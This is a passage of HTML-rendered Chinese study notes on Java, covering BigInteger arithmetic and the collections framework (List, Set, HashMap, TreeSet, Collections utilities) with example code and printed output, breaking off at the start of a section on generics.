class="hljs-string">&quot;100&quot;</span>);<br><br>BigInteger add=bigInteger1.add(bigInteger2);<br>System.out.println(add);<br><br>BigInteger subtract=bigInteger1.subtract(bigInteger2);<br>System.out.println(subtract);<br><br>BigInteger multiply=bigInteger1.multiply(bigInteger2);<br>System.out.println(multiply);<br><br>BigInteger divide=bigInteger1.divide(bigInteger2);<br>System.out.println(divide);<br></code></pre></td></tr></table></figure><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="集合框架体系"><a href="#集合框架体系" class="headerlink" title="集合框架体系"></a>集合框架体系</h2><ul><li>主要是两组 Collection 和 Map （单列集合，双列集合）</li><li>Collection 接口有两个子接口 List、Set，其实现子类都是单列集合</li><li>Map 接口的实现子类是双列集合，存放的 K-V</li></ul><h2 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h2><ul><li><p>add 添加单个元素，都是Object ，基本数据类型加入的是包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection collection=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>  collection.add(<span class="hljs-number">100</span>);<br>  collection.add(<span class="hljs-string">&quot;java&quot;</span>);<br>  collection.add(<span class="hljs-literal">false</span>);<br>  collection.add(<span class="hljs-literal">null</span>);<br>  System.out.println(collection);<br></code></pre></td></tr></table></figure></li><li><p>remove 删除指定元素，List 的子类有重载，可以按 index 删除</p></li><li><p>contains 查找元素是否存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">collection.contains(<span class="hljs-literal">false</span>);<br>   System.out.println(collection.contains(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure></li><li><p>size 获取元素个数</p></li><li><p>isEmpty 判断是否为空</p></li><li><p>clear 清空</p></li><li><p>addAll 查找多个元素是否存在</p></li><li><p>removeAll 删除多个元素</p></li></ul><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>有序，可重复</li><li>void add ( int index,Object ele ) 在 index 位置插入 ele 元素</li><li>boolean addAll ( int index,Collection eles) 从 index 位置开始将 eles 中的所有元素添加进来</li><li>Object get ( int index) 获取指定 index 位置的元素</li><li>int indexOf（Object obj)返回 obj 在当前集合中最后一次出现的位置</li><li>Object remove ( int index) 移除指定 index 位置的元素，并返回此元素</li><li>Object set （ int index,Object ele )  设置指定 index 位置的元素为 ele，相当于替换</li><li>List sublist ( int fromIndex,int toIndex)  返回从 fromIndex 到 toIndex 位置的子集合</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list.add(<span class="hljs-string">&quot;javass&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;rr&quot;</span>);<br>   list.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;java&quot;</span>);<br>       <br>   List list2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list2.add(<span class="hljs-string">&quot;javass2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;rr2&quot;</span>);<br>   list.addAll(<span class="hljs-number">1</span>,list2);<br>   list.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>       <br>   System.out.println(list.get(<span class="hljs-number">4</span>));    <span class="hljs-comment">//urm</span><br>       <br>   System.out.println(list.indexOf(<span class="hljs-string">&quot;urm2&quot;</span>));       <span class="hljs-comment">//2</span><br>       <br>   System.out.println(list.lastIndexOf(<span class="hljs-string">&quot;urm&quot;</span>));        <span class="hljs-comment">//8</span><br>   list.remove(<span class="hljs-number">8</span>);<br>   list.set(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;urm4&quot;</span>);<br>   System.out.println(list.subList(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>));      <span class="hljs-comment">//[javass2, urm2, rr2]</span><br>   System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm4]</span><br></code></pre></td></tr></table></figure><h2 id="List-遍历"><a href="#List-遍历" class="headerlink" title="List 遍历"></a>List 遍历</h2><ul><li>适用于所有实现子类</li></ul><p>迭代器遍历</p><ul><li><p>Iterator 对象为迭代器，用于遍历 Collection 集合的元素</p></li><li><p>实现 Collection 接口的集合类都有 iterator( ) 方法，返回一个迭代器</p></li><li><p>Iterator 结构</p></li><li><p>Iterator 仅用于遍历集合，Iterator 本身并不存放对象</p></li><li><p>快捷输入 itit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=list.iterator();<br>    Object next=iterator.next();<br>    System.out.println(next);       <span class="hljs-comment">//javass</span><br>        <br>    Object next2=iterator.next();<br>    System.out.println(next2);          <span class="hljs-comment">//javass2</span><br>        <br>    System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm2, urm]</span><br><span class="hljs-comment">//相当于指针</span><br></code></pre></td></tr></table></figure></li></ul><p>增强 for 循环</p><ul><li>实际上还是迭代器遍历</li><li>快捷输入 iter&#x2F;xxx.for</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Object o : list) &#123;<br>   System.out.println(o);<br>&#125;<br>        <br><span class="hljs-comment">//javass</span><br>javass2<br>urm2<br>rr2<br>urm<br>java<br>rr<br>urm2<br>urm<br></code></pre></td></tr></table></figure><p>for 循环</p><ul><li>xxx.for</li><li>前提有索引</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>    System.out.println(list.get(i));<br>&#125;<br><span class="hljs-comment">//有索引</span><br></code></pre></td></tr></table></figure><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul><li>由数组实现数据存储</li><li>Vector 和 ArrayList 基本相同，Vector 线程安全，ArrayList 执行效率高</li></ul><p>ArrayList 扩容机制</p><ul><li>有一个 Object 类型的数组 elementData，存放元素 transient Object [ ] elementData</li><li>指定大小构造器</li></ul><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul><li>对象数组存放元素，protected Object [ ]  elementData</li><li>指定扩容个数        new Vector(10,3)</li></ul><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>双向链表，有两个属性 first 和 last 分别指向首节点和尾节点</li><li>每个节点（Node 对象）里面有 prev 、next、item三个属性，item 存放元素，prev 指向前一个节点，next 指向后一个节点</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java">   Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>       Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>       Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>       java.next=rw;<br>       rw.next=urm;<br>       <br>       urm.prev=rw;<br>       rw.prev=java;<br>       <br>       Node first=java;<br>       Node last=urm;<br>       <br>       Node temp=first;<br>       <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>           System.out.println(temp);<br>           temp=temp.next;<br>       &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>    <br>    &#125;<br>   <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;item=&quot;</span> + item +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Node&#123;item=java&#125;</span><br>Node&#123;item=rw&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=java&#125;<br></code></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul><li><p>无序，没有索引，但是输出顺序固定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    hashSet.add(<span class="hljs-string">&quot;java&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;def&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;javsdv&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;rw&quot;</span>);<br>    System.out.println(hashSet);<br><span class="hljs-comment">//[java, abc, def, rw, javsdv]</span><br></code></pre></td></tr></table></figure></li><li><p>不允许重复元素，最多包含一个 null</p></li><li><p>Set 接口是 Collection 子接口，常用方法和 Collection 一样</p></li><li><p>Set 接口遍历方式</p><ul><li>迭代器遍历</li><li>增强 for 遍历</li><li>不能用索引来获取，无法使用普通 for 遍历</li></ul></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>实际上是 HashMap</p></li><li><p>无序，取决于 hash 后，确定索引结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> HashSet set=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;abc&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;def&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-literal">null</span>));<br>    set.remove(<span class="hljs-string">&quot;def&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;set&quot;</span>+set);<br><span class="hljs-comment">//true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">false</span><br>truej<br>set[<span class="hljs-literal">null</span>, java, abc]<br></code></pre></td></tr></table></figure></li></ul><p><strong>add 进行的操作</strong></p><ul><li>HashMap 底层是（数组 + 链表 + 红黑树）</li><li>添加一个元素时，先得到 hash 值，然后转化为索引值</li><li>找到存储数据表 table ，看这个索引位置是否已经存放元素，没有就直接加入，有就调用 equals 比较，相同就放弃添加，不同就添加到最后</li><li>如果一条链表元素个数&gt;&#x3D;8,table &gt;&#x3D;64，进行树华</li><li>如果链表没达到 8 ，table 没到 64，先进行数组扩容</li><li>加入 HashMap 中的元素，是否相同由 HashCode 和 equals 方法决定</li></ul><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul><li>不允许添加重复元素，是HashSet子类，底层是 LinkedHashMap</li><li>遍历顺序和添加顺序一致</li><li>存放元素方式和 HashSet 相同，在此基础上又维护了一个双向链表</li></ul><h2 id="Map-接口"><a href="#Map-接口" class="headerlink" title="Map 接口"></a>Map 接口</h2><ul><li>与 Collection 并列存在。用于保存具有映射关系的数据：Key - Value （双列集合）</li><li>key 和 value 可以是任何引用数据类型，会封装到 HashMap$Node 对象中</li><li>key 不能重复，key 一样时，新的值会替换旧的，value可以重复</li><li>key 可以为 null （只能一个），value 可以为 null (可以多个)</li><li>key 和 value 为单向一对一关系，通过指定 key 可以找到对应的 value</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">  Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>        <br>    System.out.println(hashMap);<br><span class="hljs-comment">//&#123;100=null, pass=word, user=bb&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;me&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>    hashMap.remove(<span class="hljs-string">&quot;user&quot;</span>);<br>    System.out.println(hashMap.get(<span class="hljs-string">&quot;pass&quot;</span>));<br>    System.out.println(hashMap.size());<br>    System.out.println(hashMap.isEmpty());<br>    System.out.println(hashMap.containsKey(<span class="hljs-string">&quot;admin&quot;</span>));<br>    System.out.println(hashMap);<br><span class="hljs-comment">//word</span><br><span class="hljs-number">3</span><br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br>&#123;<span class="hljs-number">100</span>=<span class="hljs-literal">null</span>, pass=word, admin=me&#125;<br></code></pre></td></tr></table></figure><h2 id="HashMap-遍历"><a href="#HashMap-遍历" class="headerlink" title="HashMap 遍历"></a>HashMap 遍历</h2><ul><li><p>取出所有的 Key ，通过 key 获取 value</p><ul><li><p>加强 for循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set keyset=hashMap.keySet();<br><span class="hljs-keyword">for</span>(Object key:keyset)&#123;<br>    System.out.println(key+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(key));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代器遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=set.iterator();<br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>Object keyset=iterator.next();<br>System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Set</span> <span class="hljs-variable">keysset</span> <span class="hljs-operator">=</span>hashMap.keySet();<br> keysset.forEach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>() &#123;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Object keyset)</span> &#123;<br>         System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>取出所有的 value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection values=hashMap.values();<br><span class="hljs-keyword">for</span>(Object value:values)&#123;<br>      System.out.println(value);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过 EntrySet 来获取 K-V</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Set entrySet=hashMap.entrySet();<br> <span class="hljs-keyword">for</span> (Object keyset:entrySet)&#123;<br> Map.Entry entry=(Map.Entry)keyset;<br>        System.out.println(entry.getKey()+<span class="hljs-string">&quot;-&quot;</span>+entry.getValue());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Key-Value 存放</p></li><li><p>keySet 和 values 返回类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set set=map.keySet();<br>System.out.println(set.getClass());<br>Collection values=map.values();<br>System.out.println(values.getClass());<br></code></pre></td></tr></table></figure></li></ul><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><ul><li>存放键值对：K-V</li><li>键值不能为 null</li><li>使用方法和 HashMap 差不多一样</li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul><li>继承自 Hashtable 类</li><li>用法和 hashmap 一样，键值不能为 null</li></ul><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>如果比较结果器为 0 ，数据不会加入到 TreeSet</p></li><li><p>在构造器中，可以传入一个比较器，指定排序规则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet treeSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>            <span class="hljs-keyword">return</span> ((String)o2).compareTo((String)o1);<br>       &#125;<br>   &#125;);<br>   treeSet.add(<span class="hljs-string">&quot;abcd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;cbd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;ebd&quot;</span>);<br>        <br>   System.out.println(treeSet);<br><span class="hljs-comment">//[ebd, cbd, abd, abcd, abc]        </span><br></code></pre></td></tr></table></figure></li></ul><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li>可以传入一个比较器，指定排序规则</li><li>如果比较器返回 0 ，则 key 不会加入到 TreeMap，值会替换</li></ul><h2 id="Collections-工具类"><a href="#Collections-工具类" class="headerlink" title="Collections 工具类"></a>Collections 工具类</h2><ul><li>是一个操作 Set、List 和 Map等集合的工具类，提供一系列静态方法</li></ul><h3 id="排序相关"><a href="#排序相关" class="headerlink" title="排序相关"></a>排序相关</h3><ul><li>reverse ( List ):反转 List 元素的顺序</li><li>shuffle ( List ) : 随机打乱</li><li>sort ( List ) : 按升序排序</li><li>sort (List,Comparator ) : 制定规则进行排序</li><li>swap ( List，int i，int  j ) : 将 i 和 j 处元素进行交换</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    arrayList.add(<span class="hljs-number">100</span>);<br>    arrayList.add(<span class="hljs-number">200</span>);<br>    arrayList.add(<span class="hljs-number">300</span>);<br>    arrayList.add(<span class="hljs-number">400</span>);<br>    arrayList.add(<span class="hljs-number">500</span>);<br>    arrayList.add(<span class="hljs-number">600</span>);<br>    arrayList.add(<span class="hljs-number">700</span>);<br>    arrayList.add(<span class="hljs-number">800</span>);<br>    arrayList.add(<span class="hljs-number">900</span>);<br>    System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>     <br><span class="hljs-comment">//reverse(List):对 List 元素进行反转</span><br>    Collections.reverse(arrayList);<br>    System.out.println(arrayList);      <span class="hljs-comment">//[900, 800, 700, 600, 500, 400, 300, 200, 100]</span><br>        <br><span class="hljs-comment">//shuffle(List):对 List 集合元素进行随机打乱</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        Collections.shuffle(arrayList);<br>          System.out.println(arrayList);<br>    &#125;<br>        <br><span class="hljs-comment">//sort(List):按升序排序</span><br>   Collections.sort(arrayList);<br>      System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>        <br><span class="hljs-comment">//swap(List,int,int):将指定 List 集合的 i 处元素和 j 处元素交换</span><br>   Collections.swap(arrayList,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>      System.out.println(arrayList);      <span class="hljs-comment">//[100, 200, 300, 600, 500, 400, 700, 800, 900]</span><br></code></pre></td></tr></table></figure><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><ul><li><p>Object max &#x2F; min（Collection &#x2F; Collecton，Comparator）：根据顺序 &#x2F; 指定规则返回最大 &#x2F; 小元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Object max=Collections.max(arrayList);<br>System.out.println(max);<br></code></pre></td></tr></table></figure></li><li><p>int frequency ( collection,Object ) :返回指定元素出现个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> frequency=Collections.frequency(arrayList,<span class="hljs-number">500</span>);<br>System.out.println(frequency);<br></code></pre></td></tr></table></figure></li><li><p>void copy （List dest，List src）:将 src 内容复制到 dest 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList new_arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(arrayList.size());<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrayList.size(); i++) &#123;<br>      new_arrayList.add(<span class="hljs-number">0</span>);  <br>   &#125;<br>  Collections.copy(new_arrayList,arrayList);<br>  System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li><li><p>boolean replaceAll（List list，Object oldVal，Object newVal）：使用新值替换所有旧值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Collections.replaceAll(new_arrayList,<span class="hljs-number">200</span>,<span class="hljs-number">1000</span>);<br>System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="集合的使用和选择"><a href="#集合的使用和选择" class="headerlink" title="集合的使用和选择"></a>集合的使用和选择</h3><p><strong>判断需要存储数据类想</strong></p><ul><li>一组对象</li><li>一组键值对</li></ul><p><strong>一组对象（单列）：Collection 接口</strong></p><ul><li><p>允许重复：List</p><ul><li>增删多：LinkedList （底层是双向链表）</li><li>改查多：ArrayList（底层是 Object 类型的可变数组）</li></ul></li><li><p>不允许重复：Set</p><ul><li>无序：HashSet（底层是 HashMap，数组 + 链表 +红黑树）</li><li>排序：TreeSet</li><li>插入和取出顺序一致：LinkedHashSet（底层是数组 + 双向链表）</li></ul></li></ul><p><strong>一组键值对（双列）：Map 接口</strong></p><ul><li>键无序：HashMap（ 数组 + 链表 + 红黑树 ）</li><li>键排序：TreeMap</li><li>键插入和取出顺序一致：LinkedHashMap</li><li>读取文件：Properties</li></ul><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p>public class 